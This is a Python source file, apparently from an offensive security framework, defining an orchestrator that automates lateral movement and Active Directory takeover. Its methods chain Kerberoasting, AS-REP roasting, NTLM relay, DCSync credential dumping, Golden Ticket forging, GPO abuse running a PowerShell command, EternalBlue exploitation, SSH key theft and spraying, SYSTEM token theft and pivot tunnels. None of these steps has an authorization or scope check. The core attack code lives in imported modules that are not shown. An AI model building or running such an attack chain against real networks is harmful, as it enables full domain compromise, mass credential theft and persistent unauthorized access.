"""
Phase 7 Engine - Lateral Movement & Domain Dominance Orchestrator
"""

import asyncio
import logging
from typing import Dict, Any, List, Optional
from datetime import datetime

# Active Directory
from active_directory.bloodhound_analyzer import BloodHoundAnalyzer
from active_directory.kerberos_attacks import KerberosAttacks
from active_directory.dcsync import DCSyncAttack
from active_directory.ntlm_relay import NTLMRelay
from active_directory.gpo_abuse import GPOAbuse

# Lateral Movement
from lateral_movement.smb_exploitation import SMBExploitation
from lateral_movement.rdp_hijacking import RDPHijacking
from lateral_movement.ssh_lateral import SSHLateral
from lateral_movement.database_hopping import DatabaseHopping
from lateral_movement.container_escape import ContainerEscape
from lateral_movement.cloud_metadata_abuse import CloudMetadataAbuse

# Privilege Escalation
from privilege_escalation.kernel_exploit_db import KernelExploitDatabase
from privilege_escalation.misconfiguration_enum import MisconfigurationEnumerator
from privilege_escalation.token_manipulation import TokenManipulator
from privilege_escalation.process_injection import ProcessInjector
from privilege_escalation.dll_hijacking import DLLHijacker

# Pivoting
from pivoting.port_forwarding import PortForwarder
from pivoting.socks_proxy import SOCKSProxy
from pivoting.vpn_establishment import VPNEstablisher
from pivoting.route_manipulation import RouteManipulator
from pivoting.ssh_tunneling import SSHTunneling

logger = logging.getLogger(__name__)


class Phase7Engine:
    """
    Phase 7: Lateral Movement & Domain Dominance Orchestrator
    
    Coordinates:
    - Active Directory attacks
    - Network propagation
    - Privilege escalation
    - Pivoting and tunneling
    """
    
    def __init__(self, domain: str = None, os_type: str = 'linux'):
        """
        Initialize Phase 7 engine
        
        Args:
            domain: Active Directory domain
            os_type: Operating system type
        """
        self.domain = domain
        self.os_type = os_type
        
        # Active Directory
        self.bloodhound = BloodHoundAnalyzer() if domain else None
        self.kerberos = KerberosAttacks(domain) if domain else None
        self.dcsync = DCSyncAttack(domain) if domain else None
        self.ntlm_relay = NTLMRelay() if domain else None
        self.gpo_abuse = GPOAbuse(domain) if domain else None
        
        # Lateral Movement
        self.smb = SMBExploitation()
        self.rdp = RDPHijacking()
        self.ssh_lateral = SSHLateral()
        self.database = DatabaseHopping()
        self.container = ContainerEscape()
        self.cloud = CloudMetadataAbuse()
        
        # Privilege Escalation
        self.kernel_exploits = KernelExploitDatabase()
        self.misconfig_enum = MisconfigurationEnumerator(os_type)
        self.token_manip = TokenManipulator() if os_type == 'windows' else None
        self.process_inject = ProcessInjector() if os_type == 'windows' else None
        self.dll_hijack = DLLHijacker() if os_type == 'windows' else None
        
        # Pivoting
        self.port_forward = PortForwarder()
        self.socks = SOCKSProxy()
        self.vpn = VPNEstablisher()
        self.route_manip = RouteManipulator(os_type)
        self.ssh_tunnel = SSHTunneling()
        
        self.compromised_hosts = []
        self.attack_path = []
        
        logger.info(f"Phase7Engine initialized for domain: {domain}, OS: {os_type}")
        
    async def execute_ad_attack_chain(self, initial_user: str, initial_password: str) -> Dict[str, Any]:
        """
        Execute automated AD attack chain
        
        Args:
            initial_user: Initial compromised user
            initial_password: User password
            
        Returns:
            Attack results
        """
        try:
            logger.warning("=== Starting Active Directory Attack Chain ===")
            
            results = {
                'bloodhound_analysis': {},
                'kerberoasting': {},
                'asrep_roasting': {},
                'dcsync': {},
                'golden_ticket': {},
                'gpo_abuse': {}
            }
            
            # Phase 1: BloodHound Analysis
            logger.info("Phase 1: BloodHound path analysis...")
            if self.bloodhound:
                await self.bloodhound.connect()
                
                attack_plan = await self.bloodhound.generate_attack_plan(initial_user)
                results['bloodhound_analysis'] = attack_plan
                
                logger.info(f"Found {len(attack_plan.get('attack_paths', []))} attack paths")
                
            # Phase 2: Kerberoasting
            logger.info("Phase 2: Kerberoasting...")
            if self.kerberos:
                kerberoast_results = await self.kerberos.kerberoast_automated(
                    initial_user, initial_password
                )
                results['kerberoasting'] = kerberoast_results
                
            # Phase 3: AS-REP Roasting
            logger.info("Phase 3: AS-REP roasting...")
            if self.kerberos:
                asrep_results = await self.kerberos.asrep_roast_automated()
                results['asrep_roasting'] = asrep_results
                
            # Phase 4: NTLM Relay
            logger.info("Phase 4: NTLM relay attacks...")
            if self.ntlm_relay:
                targets = await self.ntlm_relay.scan_for_smb_signing(['10.0.0.0/24'])
                if targets:
                    await self.ntlm_relay.start_relay_server(targets, 'smb')
                    
            # Phase 5: DCSync (if DA obtained)
            logger.info("Phase 5: DCSync attack...")
            if self.dcsync:
                credentials = await self.dcsync.dcsync_all_users()
                results['dcsync'] = {
                    'total_credentials': len(credentials),
                    'credentials': credentials[:5]  # First 5 for logging
                }
                
                # Get krbtgt hash for Golden Ticket
                krbtgt_hash = await self.dcsync.get_krbtgt_hash()
                if krbtgt_hash:
                    # Generate Golden Ticket
                    if self.kerberos:
                        await self.kerberos.generate_golden_ticket(
                            "S-1-5-21-domain-SID",
                            krbtgt_hash['ntlm_hash'],
                            "Administrator"
                        )
                        results['golden_ticket'] = {'generated': True}
                        
            # Phase 6: GPO Abuse
            logger.info("Phase 6: GPO abuse...")
            if self.gpo_abuse:
                editable_gpos = await self.gpo_abuse.enumerate_editable_gpos(initial_user)
                results['gpo_abuse'] = {'editable_gpos': len(editable_gpos)}
                
                if editable_gpos:
                    await self.gpo_abuse.add_immediate_task(
                        editable_gpos[0]['name'],
                        "powershell -c 'whoami > C:\\temp\\pwned.txt'"
                    )
                    
            logger.warning("=== AD Attack Chain Complete ===")
            return results
            
        except Exception as e:
            logger.error(f"AD attack chain failed: {e}")
            return {}
            
    async def lateral_movement_campaign(self, targets: List[str], 
                                       credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        Execute lateral movement across network
        
        Args:
            targets: List of target IPs/hostnames
            credentials: Dictionary of username: password
            
        Returns:
            Lateral movement results
        """
        try:
            logger.warning("=== Starting Lateral Movement Campaign ===")
            
            results = {
                'smb_exploitation': [],
                'rdp_hijacking': [],
                'ssh_lateral': [],
                'database_hopping': [],
                'total_compromised': 0
            }
            
            # SMB Exploitation
            logger.info("Attempting SMB exploitation...")
            eternalblue_targets = await self.smb.scan_for_eternalblue(targets)
            for target in eternalblue_targets:
                success = await self.smb.exploit_eternalblue(target['target'])
                if success:
                    results['smb_exploitation'].append(target['target'])
                    self.compromised_hosts.append(target['target'])
                    
            # RDP Attacks
            logger.info("Attempting RDP attacks...")
            for target in targets:
                for username, password in credentials.items():
                    sessions = await self.rdp.enumerate_rdp_sessions(target, username, password)
                    if sessions:
                        results['rdp_hijacking'].append({
                            'target': target,
                            'sessions': len(sessions)
                        })
                        
            # SSH Lateral Movement
            logger.info("Attempting SSH lateral movement...")
            for target in targets:
                keys = await self.ssh_lateral.steal_ssh_keys(target)
                if keys:
                    # Spray keys across network
                    successful = await self.ssh_lateral.ssh_key_spray(
                        targets, keys[0]['path']
                    )
                    results['ssh_lateral'].extend(successful)
                    
            # Database Hopping
            logger.info("Attempting database hopping...")
            for target in targets:
                for username, password in credentials.items():
                    links = await self.database.enumerate_sql_server_links(
                        target, username, password
                    )
                    if links:
                        results['database_hopping'].append({
                            'server': target,
                            'links': len(links)
                        })
                        
            results['total_compromised'] = len(self.compromised_hosts)
            
            logger.warning(f"=== Lateral Movement Complete - {results['total_compromised']} hosts compromised ===")
            return results
            
        except Exception as e:
            logger.error(f"Lateral movement campaign failed: {e}")
            return {}
            
    async def privilege_escalation_automated(self, target_os: str, target_version: str) -> Dict[str, Any]:
        """
        Automated privilege escalation
        
        Args:
            target_os: Target OS (Windows/Linux)
            target_version: OS version
            
        Returns:
            Escalation results
        """
        try:
            logger.warning("=== Starting Automated Privilege Escalation ===")
            
            results = {
                'kernel_exploits': [],
                'misconfigurations': [],
                'token_theft': False,
                'escalated': False
            }
            
            # Find applicable kernel exploits
            logger.info("Searching for kernel exploits...")
            exploits = await self.kernel_exploits.find_exploits_for_system(
                target_os, target_version
            )
            results['kernel_exploits'] = [
                {
                    'cve': e.cve,
                    'name': e.name,
                    'success_rate': e.success_rate
                } for e in exploits[:3]  # Top 3
            ]
            
            # Enumerate misconfigurations
            logger.info("Enumerating misconfigurations...")
            if target_os.lower() == 'linux':
                suid = await self.misconfig_enum.enumerate_suid_binaries()
                sudo = await self.misconfig_enum.enumerate_sudo_permissions()
                caps = await self.misconfig_enum.enumerate_capabilities()
                
                results['misconfigurations'] = {
                    'suid': len([s for s in suid if s.get('exploitable')]),
                    'sudo': len([s for s in sudo if s.get('exploitable')]),
                    'capabilities': len([c for c in caps if c.get('exploitable')])
                }
                
            elif target_os.lower() == 'windows':
                # Token manipulation
                if self.token_manip:
                    tokens = await self.token_manip.enumerate_tokens()
                    if tokens:
                        # Steal SYSTEM token
                        system_token = next((t for t in tokens if 'SYSTEM' in t['user']), None)
                        if system_token:
                            success = await self.token_manip.steal_token(system_token['pid'])
                            results['token_theft'] = success
                            results['escalated'] = success
                            
            logger.warning(f"=== Privilege Escalation {'Successful' if results['escalated'] else 'Attempted'} ===")
            return results
            
        except Exception as e:
            logger.error(f"Privilege escalation failed: {e}")
            return {}
            
    async def establish_persistence_tunnels(self, pivot_host: str, 
                                           internal_network: str) -> Dict[str, Any]:
        """
        Establish pivoting infrastructure
        
        Args:
            pivot_host: Pivot/jump host
            internal_network: Internal network CIDR
            
        Returns:
            Tunneling results
        """
        try:
            logger.warning("=== Establishing Persistence Tunnels ===")
            
            results = {
                'socks_proxy': False,
                'vpn_tunnel': False,
                'port_forwards': [],
                'routes_added': []
            }
            
            # Setup SOCKS proxy
            logger.info("Setting up SOCKS proxy...")
            socks_success = await self.socks.ssh_socks_tunnel(
                pivot_host, 'root', 1080
            )
            results['socks_proxy'] = socks_success
            
            # Establish VPN
            logger.info("Establishing VPN tunnel...")
            vpn_success = await self.vpn.setup_wireguard_server(
                'wg0', '10.8.0.0/24', 51820
            )
            results['vpn_tunnel'] = vpn_success
            
            # Add routes
            logger.info("Adding routes to internal network...")
            route_success = await self.route_manip.add_route(
                internal_network.split('/')[0],
                '255.255.255.0',
                pivot_host
            )
            if route_success:
                results['routes_added'].append(internal_network)
                
            # Enable IP forwarding on pivot
            await self.route_manip.enable_ip_forwarding()
            
            logger.warning("=== Tunneling Infrastructure Complete ===")
            return results
            
        except Exception as e:
            logger.error(f"Tunnel establishment failed: {e}")
            return {}
            
    async def generate_phase7_report(self) -> Dict[str, Any]:
        """
        Generate comprehensive Phase 7 report
        
        Returns:
            Phase 7 activity report
        """
        try:
            report = {
                'timestamp': datetime.now().isoformat(),
                'phase': 'Phase 7: Lateral Movement & Domain Dominance',
                'domain': self.domain,
                'compromised_hosts': len(self.compromised_hosts),
                'hosts': self.compromised_hosts,
                'attack_path': self.attack_path,
                'active_tunnels': {
                    'socks_proxies': len(self.socks.get_active_proxies()),
                    'vpns': len(self.vpn.get_active_vpns()),
                    'ssh_tunnels': len(self.ssh_tunnel.get_active_tunnels()),
                    'port_forwards': len(self.port_forward.list_active_forwards())
                },
                'statistics': {
                    'total_operations': len(self.attack_path),
                    'success_rate': self._calculate_success_rate()
                }
            }
            
            logger.info("Phase 7 report generated")
            return report
            
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            return {}
            
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate"""
        if not self.attack_path:
            return 0.0
        successful = sum(1 for op in self.attack_path if op.get('success', False))
        return (successful / len(self.attack_path)) * 100
